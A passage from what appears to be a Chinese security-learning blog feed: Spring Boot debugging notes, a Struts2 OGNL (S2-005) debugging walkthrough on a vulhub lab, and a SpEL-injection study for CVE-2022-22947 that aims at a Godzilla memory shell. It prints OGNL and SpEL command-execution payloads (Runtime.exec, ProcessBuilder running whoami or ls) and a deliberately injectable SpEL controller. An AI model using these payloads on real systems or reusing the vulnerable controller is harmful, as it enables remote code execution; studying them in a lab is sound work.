class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> userService.getUserById(id);</span><br><span class="line">        model.addAttribute(<span class="string">&quot;user&quot;</span>, user);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;user&quot;</span>; <span class="comment">// 视图名称为 user</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​在上面的代码中，方法返回了一个 String 类型的字符串 “user”，表示返回的 VIEWNAME 是 “user”。这个 VIEWNAME 会被视图解析器（ViewResolver）解析成对应的视图，然后使用模型中的数据进行视图渲染。</p><ul><li>溢出问题</li></ul><p>在特定的数量称金额时发生浮点的溢出</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230530142842220.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230530142842220.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230530142842220"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230530142921370.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230530142921370.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230530142921370"></p><p>需要用BigDecimal提高精度，先把double型转为string，再转为BigDecimal的Double，精度能提升许多：</p><p><code>BigDecimal difsum = new BigDecimal(Double.toString(sum));</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">double</span> <span class="title function_">getCartItemTotal</span><span class="params">(List&lt;CartVo&gt; list)</span>&#123;</span><br><span class="line">    <span class="type">double</span> sum=<span class="number">0.0</span>;</span><br><span class="line">    <span class="type">BigDecimal</span> <span class="variable">difsum</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BigDecimal</span>(Double.toString(sum));</span><br><span class="line">    <span class="keyword">for</span>(CartVo cart:list)&#123;</span><br><span class="line">        <span class="type">BigDecimal</span> <span class="variable">price</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BigDecimal</span>(Double.toString(cart.getNewPrice()));</span><br><span class="line">        <span class="type">BigDecimal</span> <span class="variable">count</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BigDecimal</span>(Integer.toString(cart.getCount()));</span><br><span class="line">        difsum = difsum.add(price.multiply(count));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> difsum.doubleValue();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230530144752481.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230530144752481.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230530144752481"></p><ul><li>在函数传参和接收参数的时候，没弄懂<code>List&lt;String&gt;</code>和<code>String[]</code>的区别，如下：</li></ul><blockquote><ol><li><p>长度不同<br> String[]是一个固定长度的数组，一旦创建后长度就不能改变。而List<String>是一个可变长度的列表，可以动态添加、删除元素。</p></li><li><p>内存占用不同<br> String[]是一个对象数组，需要在内存中连续分配一段固定大小的空间来存储所有元素，因此占用的内存空间是固定的。而List<String>是一个对象列表，每个元素是一个独立的对象，需要在内存中单独分配空间来存储，因此占用的内存空间是动态变化的。</p></li><li><p>访问方式不同</p></li></ol><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230603151050507.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230603151050507.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230603151050507"></p><ol start="4"><li>功能不同<br> String[]提供了一些数组相关的操作，例如排序、复制、查找等。而List<String>提供了一些列表相关的操作，例如添加、删除、插入、替换等。</li></ol></blockquote><p>所以，这两种参数混着用是不行的</p><ul><li>我一个改了一天的问题，如下报错：</li></ul><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230603172051633.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230603172051633.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230603172051633"></p><p>我的订单页面前端与后端的通道点在：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">loadData</span>(<span class="params">page,pageSize</span>) &#123;</span><br><span class="line">    $(<span class="string">&quot;#orderData&quot;</span>).<span class="title function_">load</span>(contextPath + <span class="string">&quot;/order/getOrderListData&quot;</span>,<span class="title function_">queryData</span>(page,pageSize))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在OrderController里处理数据展示的逻辑：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/getOrderListData&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getOrderListData</span><span class="params">(HttpSession session, OrderQueryVo orderQueryVo, Model model)</span>&#123;</span><br><span class="line">    <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> (User) session.getAttribute(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">    List&lt;Order&gt; orders = orderService.findUserOrder(user.getId(),orderQueryVo);</span><br><span class="line">    model.addAttribute(<span class="string">&quot;orders&quot;</span>,orders);</span><br><span class="line">    model.addAttribute(<span class="string">&quot;pre&quot;</span>,orderQueryVo.getPage() -<span class="number">1</span>);</span><br><span class="line">    model.addAttribute(<span class="string">&quot;next&quot;</span>,orderQueryVo.getPage() + <span class="number">1</span>);</span><br><span class="line">    model.addAttribute(<span class="string">&quot;cur&quot;</span>,orderQueryVo.getPage());</span><br><span class="line">    model.addAttribute(<span class="string">&quot;pages&quot;</span>,orderService.findUserOrderPages(user.getId(),orderQueryVo));</span><br><span class="line">    model.addAttribute(<span class="string">&quot;pageSize&quot;</span>,orderQueryVo.getPageSize());</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;orderData&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中数据查询的关键语句为：<code>List&lt;Order&gt; orders = orderService.findUserOrder(user.getId(),orderQueryVo);</code></p><p>于是自然而然的转到orderService.findUserOrder:</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230603172521873.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230603172521873.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230603172521873"></p><p>然后我想用一手高级用法，于是用的OrderMapper.xml做mapper映射，OrderMapper.xml里定义findOrderAndOrderDetailListByUser的SQL查询语句，再通过mapper映射过去</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230603172908435.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230603172908435.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230603172908435"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230603172959663.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230603172959663.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230603172959663"></p><p>然后就出现了注入失败的问题：</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230603172051633.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230603172051633.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230603172051633"></p><p>没错！结果就是在application.xml对mapper注入扫描路径的问题：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mapper-locations: classpath*:mapper/*/*Mapper.xml</span><br></pre></td></tr></table></figure><p>应该是：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mapper-locations: classpath*:mapper/*Mapper.xml</span><br></pre></td></tr></table></figure><blockquote><p>在Spring Boot中，可以使用通配符来匹配多个Mapper映射文件的路径。通配符的使用方法是在路径中使用*号代替任意字符，例如：<br>- <code>classpath*:mapper/*.xml</code>：表示匹配classpath下的所有以.xml结尾的文件，且文件名在mapper目录下。<br>- <code>classpath*:mapper/*Mapper.xml</code>：表示匹配classpath下的所有以Mapper.xml结尾的文件，且文件名在mapper目录下。<br>- <code>classpath*:mapper/*/*Mapper.xml</code>：表示匹配classpath下的所有以Mapper.xml结尾的文件，且文件名在mapper目录下的子目录中。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
          <category> java杂谈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java杂论 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>struct2-fastjson-shiro-jboss合集</title>
      <link href="/2023/05/01/struct2-fastjson-shiro-jboss-he-ji/"/>
      <url>/2023/05/01/struct2-fastjson-shiro-jboss-he-ji/</url>
      
        <content type="html"><![CDATA[<p>最近必火出了一个反序列化的视频，出来我就买了，很快啊，马上来篇总结</p><p>漏洞环境均为docker compose起的vulhub，然后环境拉出来，IDEA配个远程调试</p><h1 id="struts2"><a href="#struts2" class="headerlink" title="struts2"></a>struts2</h1><h2 id="s2-005"><a href="#s2-005" class="headerlink" title="s2-005"></a>s2-005</h2><p>如何快速判断目标主机是否使用了struct2:路径中会存在xxx.action</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230526124630577.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230526124630577.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230526124630577"></p><p>依次为执行到下一行，步入和强制步入</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230526125956617.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230526125956617.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230526125956617"></p><p>如果调试中没有步入，应该是没有导入依赖包。在lib库右键添加库，选择默认(Project library的进行添加</p><p>payload：</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230608095226448.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230608095226448.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230608095226448"></p><p>用第一个payload做下调试</p><p><code>%&#123;&quot;tomcatBinDir&#123;&quot;+@java.lang.System@getProperty(&quot;user.dir&quot;)+&quot;&#125;&quot;&#125;</code>，原理就是通过OGNL多次解析%{}，从而调用了java.lang.Sytem的getProperty(“user.dir”)来获取路径</p><h3 id="循环解析ognl"><a href="#循环解析ognl" class="headerlink" title="循环解析ognl"></a>循环解析ognl</h3><p>strut2 001就是利用了在解析表单时利用了OGNL(%{})来进行解析，入口点在TextParseUtil：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> expression;</span><br></pre></td></tr></table></figure><p>直接打上断点，记得要右上角下载源码</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230608092433328.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230608092433328.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230608092433328"></p><p>最开始的expression是index.jsp，</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230608092655596.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230608092655596.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230608092655596"></p><p>一直跳过直到expression为%{username}<img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230608092812330.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230608092812330.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230608092812330"></p><p>开始步过，start来到0</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230608093022809.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230608093022809.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230608093022809"></p><p>在这里while条件都为真，进入循环，循环就是取%{}中间的值</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230608093110602.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230608093110602.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230608093110602"></p><p>强制跳到end &#x3D; x - 1</p><p>在这里步入可以看到跳到了OgnlValueStack</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230608093647089.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230608093647089.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230608093647089"></p><p>下面的调试就不详细讲了，一样的思路，算了还是记录一下</p><p>一直步过到执行OgnlUtil.getValue()获取表达式的值，步入</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230608103727072.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230608103727072.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230608103727072"></p><p>调用了Ognl对象的方法，继续步入</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230608103746199.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230608103746199.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230608103746199"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230608103805245.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230608103805245.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230608103805245"></p><p>运行到这一步时，reult就是输入的username的值</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230608103849164.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230608103849164.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230608103849164"></p><p>返回到OgnlValueStack，把取出来的username的值赋给了value</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230608104019300.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230608104019300.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230608104019300"></p><p>上述的步骤就是通过findValue找到username里的值，相当于php里的<code>value = $_POST[&#39;username&#39;];</code></p><p>因为处于while循环，且每次循环后面都把获取到的值再次赋给了expression。所以实际上这是一个多次解析，也就是%</p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
          <category> 框架漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fastjson </tag>
            
            <tag> shiro </tag>
            
            <tag> struct2 </tag>
            
            <tag> jboss </tag>
            
            <tag> java反序列化工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Cloud GateWay CVE-2022-22947构造哥斯拉马</title>
      <link href="/2023/04/19/spring-cloud-gateway-cve-2022-22947-spel-biao-da-shi-zhu-ru/"/>
      <url>/2023/04/19/spring-cloud-gateway-cve-2022-22947-spel-biao-da-shi-zhu-ru/</url>
      
        <content type="html"><![CDATA[<p>这篇文章的主要目的是学习一下spel表达式注入和哥斯拉内存马注入，还有神器java-object-searcher的使用</p><h1 id="SPEL表达式注入"><a href="#SPEL表达式注入" class="headerlink" title="SPEL表达式注入"></a>SPEL表达式注入</h1><ul><li>spel支持在运行时查询和操作对象图，以API接口的形式创建，所以可以集成到其他应用程序和框架中</li></ul><h3 id="spel接口"><a href="#spel接口" class="headerlink" title="spel接口"></a>spel接口</h3><ul><li>ExpressionParser接口：解析器</li></ul><blockquote><p>ExpressionParser接口下的parseExpression()方法将字符串表达式转化为Expression对象</p><ul><li>parseExpression()接收参数：</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Expression <span class="title function_">parseExpression</span><span class="params">(String expressionString, ParserContext context)</span>;</span><br></pre></td></tr></table></figure><p>其中parserContext定义了字符串表达式是否为模板，和模板开始与结束字符</p></blockquote><p>我们经常看见的spel表达式以<code>#&#123;xxx&#125;</code>的形式出现，他的parserContext如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ParserContext</span> <span class="variable">parserContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ParserContext</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isTemplate</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> String <span class="title function_">getExpressionPrefix</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;#&#123;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> String <span class="title function_">getExpressionSuffix</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br></pre></td></tr></table></figure><ul><li>EvaluationContext接口：表示上下文环境。以SpelExpression实现，提供getValue和setValue操作对象值</li></ul><h3 id="spel语法"><a href="#spel语法" class="headerlink" title="spel语法"></a>spel语法</h3><ul><li>T(全限定名)表示java.lang.Class，RCE的关键，如下使用<code>T(java.lang.Runtime)</code>获取了类，并且可以直接使用类下的方法</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">T(java.lang.Runtime).getRuntime().exec(<span class="string">&quot;calc&quot;</span>)</span><br></pre></td></tr></table></figure><ul><li>和java一样的关键字：new进行类实例化，instanceof判断type</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(<span class="string">&quot;calc.exe).start()</span></span><br></pre></td></tr></table></figure><ul><li>变量定义和引用：<ul><li>变量定义：<code>EvaluationContext的setVariable(name,value)</code></li><li>引用：<code>#name</code>，还支持<code>#this</code>和<code>#root</code></li></ul></li></ul><h3 id="spel-Controller"><a href="#spel-Controller" class="headerlink" title="spel Controller"></a>spel Controller</h3><p>pom.xml中添加依赖：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-expression<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>xxx<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>创建一个controller接收字符参数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">spel</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/spel&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">spel</span><span class="params">(String input)</span>&#123;</span><br><span class="line">        <span class="type">SpelExpressionParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SpelExpressionParser</span>();</span><br><span class="line">        <span class="type">Expression</span> <span class="variable">expression</span> <span class="operator">=</span> parser.parseExpression(input);</span><br><span class="line">        <span class="keyword">return</span> expression.getValue().toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用spelExpressionParser接口创建解析器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">SpelExpressionParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SpelExpressionParser</span>();</span><br></pre></td></tr></table></figure><p>指定ExpressionParser#parseExpression()来解析表达式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Expression</span> <span class="variable">expression</span> <span class="operator">=</span> parser.parseExpression(input);</span><br></pre></td></tr></table></figure><p>getValue根据上下文获得表达式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">expression.getValue().toString();</span><br></pre></td></tr></table></figure><p>如果向该Controller HTTP传参，参数名为Input，就能进行spel解析</p><h2 id="spel回显"><a href="#spel回显" class="headerlink" title="spel回显"></a>spel回显</h2><ol><li><p><code>commons-io</code>组件回显。但是需要服务器存在该组件，一般都没有</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">T(org.apache.commons.io.IOUtils).toString(payload).getInputStream())</span><br></pre></td></tr></table></figure></li><li><p>jdk&gt;&#x3D;9时使用JShell</p></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">T(SomeWhitelistedClassNotPartOfJDK).ClassLoader.loadClass(<span class="string">&quot;jdk.jshell.JShell&quot;</span>,<span class="literal">true</span>).Methods[<span class="number">6</span>].invoke(<span class="literal">null</span>,&#123;&#125;).eval(<span class="string">&#x27;java payload&#x27;</span>).toString()</span><br></pre></td></tr></table></figure><ol start="3"><li>jdk原生类BufferedReader</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">java</span>.io.BufferedReader(<span class="keyword">new</span> <span class="title class_">java</span>.io.InputStreamReader(<span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>( <span class="string">&quot;whoami&quot;</span>).start().getInputStream(), <span class="string">&quot;gbk&quot;</span>)).readLine()</span><br></pre></td></tr></table></figure><ol start="4"><li>scanner</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">java</span>.util.Scanner(<span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(<span class="string">&quot;ls&quot;</span>).start().getInputStream(), <span class="string">&quot;GBK&quot;</span>).useDelimiter(<span class="string">&quot;asfsfsdfsf&quot;</span>).next()</span><br></pre></td></tr></table></figure><p>useDelimiter为分隔符</p><h1 id="Spring-Cloud-GateWay-CVE-2022-22947"><a href="#Spring-Cloud-GateWay-CVE-2022-22947" class="headerlink" title="Spring Cloud GateWay CVE-2022-22947"></a>Spring Cloud GateWay CVE-2022-22947</h1><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p>Spring Cloud GateWay版本：3.1.0&amp;&lt;&#x3D;3.0.0-3.0.6</p><p>源码：<a href="https://github.com/spring-cloud/spring-cloud-gateway/releases/tag/v3.1.0">https://github.com/spring-cloud/spring-cloud-gateway/releases/tag/v3.1.0</a></p><p>idea打开就能分析了</p><p>在<code>shortcutConfigurable#getValue</code>中，<code>#&#123;&#125;</code>包住的进行spel解析，这就是链最后的地方，控制entryValue即可实现spel注入</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230320113908131.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230320113908131.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230320113908131"></p><p>在shortcutType处使用了getValue</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230320115246762.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230320115246762.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230320115246762"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230320115309246.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230320115309246.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230320115309246"></p><p>由于是在shortcutType中的normalize中调用的getValue()，所以找也要找调用了<code>shortcutType().normalize()</code>方法的类，ConfigurationService就符合</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230328160155438.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230328160155438.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230328160155438"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230328162047694.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230328162047694.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230328162047694"></p><p>上文的<code>entry.getValue()</code>，entry即为第一个参数，也就是一个Map。这里控制<code>this.properties</code>为恶意map就能控制spel表达式</p><p>在<code>bind()</code>方法中触发了<code>normalizeProperties()</code>方法：</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230328162610459.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230328162610459.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230328162610459"></p><p>在<code>RouteDefinitionRouteLocator#lookup()</code>方法中对properties进行了设置，然后调用了bind()</p><p>properties的值为<code>predicate.getArgs()</code></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230328163322901.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230328163322901.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230328163322901"></p><p>在combinePredicates中定义了predicate的值，与routeDefinition有关</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230328172604495.png" class="lazyload placeholder" 